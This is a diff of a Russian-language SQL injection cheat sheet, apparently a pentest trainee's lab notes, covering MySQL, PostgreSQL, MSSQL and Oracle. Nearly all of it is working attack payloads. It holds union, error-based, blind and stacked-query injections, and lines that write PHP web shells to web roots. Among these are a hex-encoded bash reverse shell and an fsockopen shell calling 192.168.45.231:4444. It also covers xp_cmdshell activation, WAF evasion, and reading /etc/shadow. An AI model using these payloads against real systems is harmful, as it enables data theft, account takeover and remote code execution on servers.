@@ -1,39 +1,38 @@
-================SQL INJECTION. MySQL 3306
-ПОРЯДОК проверки SQLi:
+ПОРЯДОК проверки SQLi (не забывать о cookie-based: инъекция в заголовках cookies, user-agent):
 1) error-based: ' or 1=1 -- //"		работает, если включен вывод SQL ошибок
 2) union-based: ' ORDER BY 6 -- // --> ' UNION select null, null -- // 
-3) boolean-based: ' and 1=1 --  // должен вернуть данные, and 1=2 - не должен вернуть данные
-4) time-based: ' and if(1=1,sleep(3),0)
+3) stacked queries: '; EXEC xp_cmdshell('whoami') -- // новая команда, но поддерживается только в MSSQL, PostgreSQL, MySQL c драйвером
+	'; insert into users(username,password) values('hacker','123') -- 
+	'; update users set password='123' where username='admin' -- 
+4) blind boolean-based: ' and 1=1 --  // должен вернуть данные, and 1=2 - не должен вернуть данные
+5) blind time-based: ' and if(1=1,sleep(3),0)
 
 SELECT * FROM users WHERE username = '[INPUT]' 		=> ' or 1=1 -- //	MSSQL, MySQL, PostgreSQL, Oracle
 SELECT * FROM users WHERE (username = '[INPUT]') 	=> ') or 1=1 -- //	
-SELECT * FROM users WHERE username = "[INPUT]"  	=> " or 1=1 -- //	Oracle, PostgreSQL?, MSSQL?
+SELECT * FROM users WHERE username = "[INPUT]"  	=> " or 1=1 -- //	Oracle, PostgreSQL?, MSSQL?, MySQL?
 SELECT * FROM users WHERE (username = "[INPUT]")	=> ") or 1=1 -- //
 
+
+================SQL INJECTION. MySQL 3306
 mysql -u root -p 'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
 	подключение к MySQL, команды: "show databases;", "select table_name from information_schema.tables;"
 	"show tables from information_schema;" = "SELECT schema_name FROM information_schema.schemata;"
 	describe (= show columns from) <table name> - получить описание структуры ("describe information_schema.tables")
 	таблицы information_schema: schemata (инфа о базах), tables, columns (колонки table_name, column_name, table_schema)
-CAST()			-- преобразование типов
 select version()	-- версия
 select user()  		-- = system_user(), подключенный пользователь @ хост, с которого он подключился
 select database()	-- текущая БД
 select @@hostname	-- имя хоста сервера
 select sleep(3)
-select count(*) from <tablename>; -- // количество колонок
-select load_file('/etc/passwd')  -- // чтение файла (нужны права)
-' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile '/var/www/html/tmp/webshell.php'  -- //
-' union select 'a', 'b', 'c', 'd', 0x3c3f7068702073797374656d282262617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e34352e3233312f3434343420303e26312722293b203f3e, 'f' into outfile '/var/www/html/webshell.php' -- "
-	reverse shell в hex: <?php system("bash -c 'bash -i >& /dev/tcp/192.168.45.231/4444 0>&1'"); ?>
-' UNION SELECT "<?php $sock=fsockopen('192.168.45.231',4444);exec('/bin/sh -i <&3 >&3 2>&3'); ?>" INTO OUTFILE '/var/www/html/shell.php' -- //
-	если system() заблокирована
-' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
-	запись в файл (нужны права, файл не должен существовать), проверять количество столбцов не обязательно, но желательно
+select count(*) from <tablename>;	-- количество колонок
+select load_file('/etc/passwd') 	-- чтение файла (нужны права)
+select '<payload>' into '<filepath>'    -- запись в файл
+CAST()			-- преобразование типов
+'foo' 'bar' или CONCAT('foo','bar')
+SUBSTRING('foobar', 4, 2)			'ba'
 
 ' or 1=1 -- //	хотя бы 1 пробел после --
 ' or '1'='1 	для того, чтобы не ломать запрос и не коментить конец запроса	
-select database()		текущая БД
 select schema_name 	from information_schema.schemata				все БД
 select table_name 	from information_schema.tables	WHERE table_schema='offsec'	таблицы в БД offsec
 select column_name	from information_schema.columns	WHERE table_name='users'	колонки в таблице users в БД offsec
@@ -44,12 +43,32 @@ select column_name	from information_schema.columns	WHERE table_name='users'	коло
 ' UNION select null, table_name, database(), null, null		from information_schema.tables 	WHERE table_schema=database() -- //
 ' UNION select null, table_name, column_name, null, null	from information_schema.columns	WHERE table_name='users' -- //
 ' UNION select null, id, username, password, description 	from users -- //
+'; insert into users(username,password) values('hacker','123') -- 
+'; update users set password='123' where username='admin' -- 
 
 ' and 1=2 -- // проверка, что слепая инъекция может быть проведена, при 1=1 запись выводится, при 1=2 - нет
 ' and if(1=1,sleep(3),0) -- // тоже самое с проверкой по времени, 1=1 выполнится через 3 секунды, 1=2 мгновенно
 	с проверкой по времени запрос не выводит результат, т.к. sleep(3) возвращает 0, 0 (3й арг.) тоже возвращает 0, if возвращает false
 	для того, чтобы результат запроса был выполнен, if должен вернуть true: ' and if(1=2, sleep(3), 1)
+
+Проверка версии БД:
+' and extractvalue(1,concat(0x7e,database())) -- проверка на error-based версии, работает только при включенном выводе об ошибках
+' and updatexml(1,concat(0x7e,version()),1) --   тоже самое, также можно выполнять другие команды select
 ' and+0=sleep(10)+-- // проверка при слепой инъекции на то, что текущая БД - MySQL, если так, то задержка 10 сек
+
+Обход WAF:
+' union select 0x414141 -- 
+' union sele/**/ct 1,2 -- 
+
+Запись в файл:
+' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile '/var/www/html/tmp/webshell.php'  -- //
+' union select 'a', 'b', 'c', 'd', 0x3c3f7068702073797374656d282262617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e34352e3233312f3434343420303e26312722293b203f3e, 'f' into outfile '/var/www/html/webshell.php' -- "
+	reverse shell в hex: <?php system("bash -c 'bash -i >& /dev/tcp/192.168.45.231/4444 0>&1'"); ?>
+' UNION SELECT "<?php $sock=fsockopen('192.168.45.231',4444);exec('/bin/sh -i <&3 >&3 2>&3'); ?>" INTO OUTFILE '/var/www/html/shell.php' -- //
+	если system() заблокирована
+' union select ' \"<?php system(\$_GET['cmd']);?>\"' into outfile 'C:\\Windows\\Temp\\shell.php' -- //
+	запись в файл (нужны права, файл не должен существовать), проверять количество столбцов не обязательно, но желательно
+
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user [--dump [-T <table name> [-C <column1, column2>]]]
 	запускает проверку уязвимости GET параметра user внутри '?user=1', --dump - скопировать всю БД, --threads 10 - для ускорения
 sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
@@ -60,10 +79,34 @@ wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7
 
 
 ================SQL INJECTION. PostgreSQL 5432
+psql -U username -h 192.168.50.16 -p 5432 -d dbname
+
+select version();                 -- версия
+select current_user;              -- текущий пользователь
+select current_database();        -- текущая БД
+select pg_sleep(5);               -- задержка
+select count(*) from table;       -- количество строк
+'foo'||'bar'
+SUBSTRING('foobar', 4, 2)
+
+select pg_read_file('/etc/passwd',0,10000);			-- чтение файла
+select datname from pg_database;				-- все БД
+select schemaname from pg_tables;				-- все схемы
+select tablename from pg_tables where schemaname='public';	-- таблицы в схеме
+select column_name from information_schema.columns where table_name='users';		-- колонки
+
+select pg_read_file('/etc/passwd',0,10000);						-- чтение
+select lo_export(oid,'/var/www/html/shell.php') from pg_largeobject;			-- экспорт
+copy (select '<?php system($_GET["cmd"]); ?>') to '/var/www/html/shell.php';  -- запись
+copy эквивалентно 2 строкам:
+select lo_from_bytea(0,'<?php system($_GET["cmd"]); ?>');      -- large object
+select lo_export(oid,'/var/www/html/shell.php') from pg_largeobject;  -- экспорт
+
+' and 1=1 --
+
+Error-based:
 ' and 1=cast(version() as int) --+
 	в postgresql нельзя сравнивать разные типы, вывод для error-based инъекции, когда включен вывод ошибок
-' ORDER BY 6 -- // 
-'+union+select+null,cast(current_user+as+int),null,null,null,null+--
 ' and 1=cast(current_database() as int) -- //	вывод данных через ошибку, текущая БД
 ' and 1=cast(current_schema() as int) -- //	вывод текущей схемы текущей БД
 ' and 1=cast((select string_agg(datname,',') from pg_database) as int) -- // вывод всех БД на сервере
@@ -71,11 +114,17 @@ wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7
 ' and 1=cast((select string_agg(table_name,',') from information_schema.tables where table_schema='public') as int) -- // таблицы
 ' and 1=cast((select string_agg(column_name, ', ') from information_schema.columns where table_name='users') as int) -- // колонки
 ' and 1=cast((select string_agg(weight||'|'||height||'|'||created_at||'|'||active||'|'||gender||'|'||email, '; ') from users) as int) -- //
-
 ' and 1=cast(pg_read_file('/etc/shadow') as int) -- // чтение файлов - единственное, что обычно может быть доступно в PostgreSQL
 
+' ORDER BY 6 -- // 
+'+union+select+null,cast(current_user+as+int),null,null,null,null+--
+' union select current_database(),current_user,version() --
+' union select tablename,null from pg_tables where schemaname='public' --
+' union select column_name,null from information_schema.columns where table_name='users' --
+' union select username,password from users --
+
 Слепая инъекция:
-' and+(select pg_sleep(15)) is null --+ // проверка в слепой инъекции, что текущая БД - PostgreSQL
+' and+(select pg_sleep(10)) is null --+ // проверка в слепой инъекции, что текущая БД - PostgreSQL
 ' and (select case when 1=1 then pg_sleep(5) else pg_sleep(0) end) is null -- проверка условия (1=1 или другого) по времени выполнения
 ' and (select 123 from users limit 1)=123 -- // проверка, что есть таблица users
 ' and (select 123 from users where username='administrator')=123 -- //
@@ -83,6 +132,7 @@ wpscan --url http://alvida-eatery.local/ --api-token TlTUbNppqaZ2NrsS6jFlH27Voc7
 
 
 ================SQL INJECTION. MSSQL 1433
+sqlcmd -S 192.168.50.19 -U sa -P password
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 	подключение в MSSQL, системные команды: "select @@version", "SELECT name FROM sys.databases;"
 	sys.databases, sys.tables, sys.columns, sys.processes - представления
@@ -91,15 +141,40 @@ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
 		SELECT * FROM master.sys.views; - также вывести представления (view, виртуальные таблицы)
 	select * from model.information_schema.tables; - универсальный запрос просмотра таблиц в БД model
 	select * from offsec.dbo.users; - обращение к таблице в формате <БД>.<схема>.<таблица>	
-' and 1=convert(int,@@version) -- // проверка инъекции
-' or @@version like '%' -- //
-' union select @@version,null -- //
+
+select @@version;                 -- версия
+'foo'+'bar'
+SUBSTRING('foobar', 4, 2)
+WAITFOR DELAY '0:0:10'
+select user_name();               -- текущий пользователь в БД
+select db_name();                 -- текущая БД
+select host_name();               -- имя хоста
+select suser_name();              -- имя логина в системе
+select is_srvrolemember('sysadmin');  -- проверка прав (1 = да), роль sysadmin, полные права на БД 
+
+' and 1=1 --                                                   
+
+Error-based:
+' and 1=convert(int,@@version) -- // версия в ошибке
+' and 1=convert(int,db_name()) -- // БД в ошибке
+
+' order by 5 --
+' union select null,null,null --
+' union select @@version,db_name(),user_name() --
+' union select name,null from master.dbo.sysdatabases -- // все БД
+' union select table_name,null from information_schema.tables --  // таблицы
+' union select column_name,null from information_schema.columns where table_name='users' --  // колонки
+' union select username,password from users --
+
+Blind injectin:
+'; waitfor delay '00:00:05' --
 '; if 1=1 waitfor delay '00:00:05' -- // проверка в слепой инъекции, что текущая БД - MSSQL
 '; if user_name()='dbo' waitfor delay '00:00:05' -- // Database Owner, есть права на xp_cmdshell
 '; if is_srvrolemember('sysadmin')=1 waitfor delay '00:00:05' -- // роль sysadmin, полные права на БД 
 '; if has_perms_by_name(null, null, 'EXECUTE')=1 waitfor delay '00:00:05' -- // проверка прав на исполнение
 
 Активация работы функции xp_cmdshell:
+'; select count(*) from master.dbo.sysobjects where name='xp_cmdshell' -- // проверка доступности
 '; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; -- //
 '; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //
 '; EXECUTE xp_cmdshell 'ping -n 5 127.0.0.1'; -- // проверка, что появилась возможность выполнять xp_cmdshell
@@ -110,10 +185,33 @@ IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay
 
 
 ================SQL INJECTION. Oracle 1521
-количество колонок в SELECT должно быть не меньше, чем реальное количество колонок в таблице запроса FROM
+sqlplus scott/tiger@192.168.50.19:1521/XE
+sqlplus system/password@192.168.50.19:1521/XE as sysdba
+
+select banner from v$version where rownum=1;		-- версия
+select user from dual;                               	-- текущий пользователь
+select sys_context('userenv','current_schema') from dual;	-- текущая схема
+select sys_context('userenv','db_name') from dual;   	-- имя БД
+select sys_context('userenv','host') from dual;      	-- имя хоста
+select dbms_pipe.receive_message('a',5) from dual;   	-- задержка 5 сек
+select count(*) from all_tables;                     	-- количество таблиц
+'foo'||'bar'
+SUBSTR('foobar', 4, 2)
+dbms_pipe.receive_message(('a'),10)
+
+select name from v$database;                         	-- все БД (одна строка)
+select username from all_users;                        	-- все схемы (пользователи)
+select table_name from all_tables where owner='SCOTT'; 	-- таблицы в схеме
+select column_name from all_tab_columns where table_name='USERS';	-- колонки
+select distinct owner from all_tables;                 	-- схемы с таблицами
+
+Error-based:
+' and 1=ctxsys.drithsx.sn(1,(select banner from v$version where rownum=1)) --  -- версия в ошибке
+' and 1=ctxsys.drithsx.sn(1,(select username from all_users where rownum=1)) --  -- первый пользователь
+
 '+UNION+SELECT+'abc','def'+FROM+dual--
-'+UNION+SELECT+BANNER,NULL+FROM+v$version--
-	таблица dual всегда есть, обязательно from в запросах
+'+UNION+SELECT+BANNER,NULL+FROM+v$version+where+rownum=1--
+	таблица dual всегда есть, обязательно from в запросах, banner занимает несколько строк, поэтому выводим только 1, иначе ошибка
 '+union+select+null,ora_database_name+from+dual+--+				текущая БД, в Oracle только 1 БД для всех
 '+union+select+null,sys_context('USERENV','CURRENT_SCHEMA')+from+dual+--+	текущий пользователь (схема)
 '+union+select+null,user+from+dual+--+						текущий пользователь (схема)
@@ -123,35 +221,25 @@ IF (SELECT TOP 1 output FROM #tmp) = 'NT SERVICE\MSSQL$SQLEXPRESS' waitfor delay
 '+union+select+null,table_name+from+user_tables+--+				все таблицы данного пользователя
 '+union+select+null,column_name+from+all_tab_columns'+--+				все колонки из всех таблиц
 '+union+select+null,column_name+from+user_tab_columns+where+table_name='USERS'+--+	колонки из таблицы USERS
+' union select username,password from scott.users --
+
 Blind injection:
 '+and+(select+1+from+dual+where+dbms_pipe.receive_message(123,10)+is+null)+is+null+--+
 	прокерка слепой инъекции, что текущая БД - Oracle, если будет задержка 10 сек
 xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm -- // 1й символ пароля больше, чем "m"
 
+Stack queries (обычно не работают в Oracle):
+' begin dbms_pipe.receive_message('a',5); end; --        -- PL/SQL блок (редко)
+
+Работа с файлами:
+select utl_file.fopen('/tmp','file.txt','r') from dual;           -- открыть файл
+select utl_file.get_line(file_handle,line) from dual;             -- читать строку
+select utl_file.fclose(file_handle) from dual;                    -- закрыть
+declare f utl_file.file_type; begin f:=utl_file.fopen('/tmp','shell.php','w'); utl_file.put_line(f,'<?php system($_GET["cmd"]); ?>'); utl_file.fclose(f); end; --
+	запись в файл
+select dbms_scheduler.create_job(job_name=>'cmd',job_type=>'executable',job_action=>'/bin/sh -c "whoami > /tmp/out"',enabled=>true) from dual;
 
 
 
-MySQL:
-	'foo' 'bar' или CONCAT('foo','bar')
-	SUBSTRING('foobar', 4, 2)			'ba'
-	SELECT @@version
-	SELECT SLEEP(10)
 
-PostgreSQL:
-	'foo'||'bar'
-	SUBSTRING('foobar', 4, 2)
-	SELECT version()
-	SELECT pg_sleep(10)
-
-MSSQL:
-	'foo'+'bar'
-	SUBSTRING('foobar', 4, 2)
-	SELECT @@version
-	WAITFOR DELAY '0:0:10'
-
-Oracle:
-	'foo'||'bar'
-	SUBSTR('foobar', 4, 2)
-	SELECT banner FROM v$version
-	dbms_pipe.receive_message(('a'),10)
 
